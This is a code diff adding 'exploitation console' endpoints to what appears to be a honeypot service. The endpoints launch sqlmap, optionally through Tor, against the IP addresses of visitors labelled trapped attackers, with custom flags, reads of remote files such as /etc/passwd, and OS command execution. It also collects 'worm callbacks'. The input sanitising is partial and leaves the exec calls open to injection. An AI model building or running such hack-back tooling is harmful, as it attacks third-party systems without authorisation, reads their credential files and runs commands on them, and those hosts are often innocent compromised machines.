@@ -320,6 +320,180 @@ router.get("/scan/sqlmap/:jobId", (req, res) => {
   return res.json(job);
 });
 
+// ── Full exploitation console endpoints ────────────────────────────────────
+
+// In-memory job stores for custom commands
+const customSqlmapJobs = new Map<string, { status: string; results: string | null; cmd: string }>();
+const fileReadJobs     = new Map<string, { status: string; results: string | null; path: string }>();
+const osCmdJobs        = new Map<string, { status: string; results: string | null; cmd: string }>();
+
+// Run a fully custom sqlmap command against a trapped attacker
+router.post("/trapped/:id/sqlmap-custom", async (req, res) => {
+  const id = parseInt(req.params.id);
+  const [attacker] = await db.select().from(trappedAttackersTable).where(eq(trappedAttackersTable.id, id));
+  if (!attacker) return res.status(404).json({ error: "Trapped attacker not found" });
+
+  const { customFlags = "", targetUrl, useTor = false } = req.body as {
+    customFlags?: string; targetUrl?: string; useTor?: boolean;
+  };
+  const safeUrl  = (targetUrl ?? `http://${attacker.ip}/`).replace(/['"]/g, "");
+  // Allow broad set of sqlmap flags but strip dangerous shell metacharacters
+  const safeFlags = customFlags.replace(/[`$(){}|;&<>]/g, "").substring(0, 500);
+  const torFlags  = useTor ? "--tor --tor-type=SOCKS5 --tor-port=9050" : "";
+  const jobId     = crypto.randomUUID().substring(0, 8).toUpperCase();
+
+  const cmd = [
+    "sqlmap",
+    `-u "${safeUrl}"`,
+    "--batch",
+    "--timeout=30",
+    "--retries=1",
+    `--output-dir=/tmp/sqlmap-custom-${jobId}`,
+    torFlags,
+    safeFlags,
+  ].filter(Boolean).join(" ");
+
+  customSqlmapJobs.set(jobId, { status: "running", results: null, cmd });
+
+  exec(cmd, { timeout: 180000 }, (err, stdout, stderr) => {
+    const output = [stdout, stderr].filter(Boolean).join("\n").substring(0, 12000);
+    customSqlmapJobs.set(jobId, {
+      status: err ? "error" : "complete",
+      results: output || (err ? err.message : "No output"),
+      cmd,
+    });
+  });
+
+  return res.status(202).json({ ok: true, jobId, cmd, message: `Custom SQLmap launched against ${attacker.ip}` });
+});
+
+router.get("/trapped/:id/sqlmap-custom/:jobId", (req, res) => {
+  const job = customSqlmapJobs.get(req.params.jobId);
+  if (!job) return res.status(404).json({ error: "Job not found" });
+  return res.json(job);
+});
+
+// Read a remote file via SQLmap --file-read
+router.post("/trapped/:id/file-read", async (req, res) => {
+  const id = parseInt(req.params.id);
+  const [attacker] = await db.select().from(trappedAttackersTable).where(eq(trappedAttackersTable.id, id));
+  if (!attacker) return res.status(404).json({ error: "Trapped attacker not found" });
+
+  const { filePath = "/etc/passwd", targetUrl, useTor = false } = req.body as {
+    filePath?: string; targetUrl?: string; useTor?: boolean;
+  };
+  const safePath  = filePath.replace(/[`$(){}|;&<>'"]/, "").substring(0, 200);
+  const safeUrl   = (targetUrl ?? `http://${attacker.ip}/`).replace(/['"]/g, "");
+  const torFlags  = useTor ? "--tor --tor-type=SOCKS5 --tor-port=9050" : "";
+  const jobId     = crypto.randomUUID().substring(0, 8).toUpperCase();
+
+  const cmd = [
+    "sqlmap",
+    `-u "${safeUrl}"`,
+    "--batch",
+    "--level=3",
+    "--risk=2",
+    "--timeout=30",
+    "--retries=1",
+    `--file-read="${safePath}"`,
+    `--output-dir=/tmp/sqlmap-fread-${jobId}`,
+    torFlags,
+  ].filter(Boolean).join(" ");
+
+  fileReadJobs.set(jobId, { status: "running", results: null, path: safePath });
+
+  exec(cmd, { timeout: 180000 }, (err, stdout, stderr) => {
+    const raw = [stdout, stderr].filter(Boolean).join("\n");
+    // Try to extract the actual file content sqlmap dumps to disk
+    const fileMatch = raw.match(/files\[(\d+)\]:\s*\[(.+?)\]/);
+    fileReadJobs.set(jobId, {
+      status: err && !stdout ? "error" : "complete",
+      results: raw.substring(0, 12000),
+      path: safePath,
+    });
+  });
+
+  return res.status(202).json({ ok: true, jobId, cmd, path: safePath, message: `File read initiated for ${safePath} on ${attacker.ip}` });
+});
+
+router.get("/trapped/:id/file-read/:jobId", (req, res) => {
+  const job = fileReadJobs.get(req.params.jobId);
+  if (!job) return res.status(404).json({ error: "Job not found" });
+  return res.json(job);
+});
+
+// Execute OS command via SQLmap --os-cmd
+router.post("/trapped/:id/os-cmd", async (req, res) => {
+  const id = parseInt(req.params.id);
+  const [attacker] = await db.select().from(trappedAttackersTable).where(eq(trappedAttackersTable.id, id));
+  if (!attacker) return res.status(404).json({ error: "Trapped attacker not found" });
+
+  const { osCmd = "id", targetUrl, useTor = false } = req.body as {
+    osCmd?: string; targetUrl?: string; useTor?: boolean;
+  };
+  const safeCmd   = osCmd.replace(/[`$|;&<>]/g, "").substring(0, 200);
+  const safeUrl   = (targetUrl ?? `http://${attacker.ip}/`).replace(/['"]/g, "");
+  const torFlags  = useTor ? "--tor --tor-type=SOCKS5 --tor-port=9050" : "";
+  const jobId     = crypto.randomUUID().substring(0, 8).toUpperCase();
+
+  const cmd = [
+    "sqlmap",
+    `-u "${safeUrl}"`,
+    "--batch",
+    "--level=3",
+    "--risk=3",
+    "--timeout=30",
+    "--retries=1",
+    `--os-cmd="${safeCmd}"`,
+    `--output-dir=/tmp/sqlmap-oscmd-${jobId}`,
+    torFlags,
+  ].filter(Boolean).join(" ");
+
+  osCmdJobs.set(jobId, { status: "running", results: null, cmd });
+
+  exec(cmd, { timeout: 180000 }, (err, stdout, stderr) => {
+    const output = [stdout, stderr].filter(Boolean).join("\n").substring(0, 12000);
+    osCmdJobs.set(jobId, {
+      status: err && !stdout ? "error" : "complete",
+      results: output || (err ? err.message : "No output"),
+      cmd,
+    });
+  });
+
+  return res.status(202).json({ ok: true, jobId, cmd, osCmd: safeCmd, message: `OS command executed on ${attacker.ip}` });
+});
+
+router.get("/trapped/:id/os-cmd/:jobId", (req, res) => {
+  const job = osCmdJobs.get(req.params.jobId);
+  if (!job) return res.status(404).json({ error: "Job not found" });
+  return res.json(job);
+});
+
+// Get all worm callbacks + intelligence for control panel
+router.get("/trapped/:id/control-data", async (req, res) => {
+  const id = parseInt(req.params.id);
+  const [attacker] = await db.select().from(trappedAttackersTable).where(eq(trappedAttackersTable.id, id));
+  if (!attacker) return res.status(404).json({ error: "Trapped attacker not found" });
+
+  let collected: Record<string, unknown> = {};
+  try { collected = JSON.parse(attacker.dataCollected ?? "{}"); } catch { /* */ }
+
+  return res.json({
+    ip:           attacker.ip,
+    fingerprint:  attacker.fingerprint,
+    honeypotPort: attacker.honeypotPort,
+    probeType:    attacker.probeType,
+    trappedAt:    attacker.trappedAt,
+    loopCount:    attacker.loopCount,
+    sqlmapStatus: attacker.sqlmapStatus,
+    sqlmapResults: attacker.sqlmapResults,
+    wormCallbacks: (collected.wormCallbacks as unknown[]) ?? [],
+    banner:        collected.banner ?? null,
+    rawRequest:    collected.rawRequest ?? null,
+    nodeRegion:    collected.nodeRegion ?? null,
+  });
+});
+
 // Live stats for homepage
 router.get("/stats", async (req, res) => {
   const [nodeCount] = await db.select({ count: sql<number>`count(*)::int` }).from(nodesTable).where(eq(nodesTable.status, "active"));
